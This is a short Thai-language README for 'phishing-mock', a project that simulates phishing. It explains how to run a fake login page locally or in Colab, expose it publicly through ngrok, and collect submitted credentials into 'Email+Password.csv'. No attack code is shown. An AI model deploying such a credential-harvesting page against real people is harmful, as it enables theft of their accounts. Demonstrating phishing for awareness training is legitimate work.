# phishing-mock
จำลองการโจรกรรมข้อมูลแบบ Phishing
เวอร์ชั่นออนไลน์ : [![Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/BoszGTec/phishing-mock/blob/main/gcolab/BoszGTec_phishing_mock.ipynb)
![image](https://user-images.githubusercontent.com/95701554/149656209-19fc89bc-946b-426a-9fe6-77297e8c3613.png)
## การใช้
1. ทำการติดตั้งไลบารี่ก่อนโดยใช้คำสั่ง
 ```
 pip install -r requirements.txt
 ```
 2. เริ่มใช้โดยคำสั้ง
  ```
   python3 start.py
  ```
  หรือ (หากต้องการเผยแพร่ให้คนอื่นดู)
  ```
  python3 start with ngrok.py
  ```
## การใช้บน Colab
1. กด Clone Repo และ Install requirements
2. ถ้าต้องการเผยแพร่ให้คนอื่นดู กด Use With Ngrok (ต้องTokenก่อน หาได้จาก : https://ngrok.com/ )
3. กด Start เพื่อเริ่มการทำงาน
4. ถ้าต้องการดูผลลัพธ์ กด  Show csv
5. ถ้าต้องการดาวน์โหลดผลลัพธ์ กด  Download csv
* ผลลัพธ์จะเป็นไฟล์ .csv ชื่อ "Email+Password.csv"
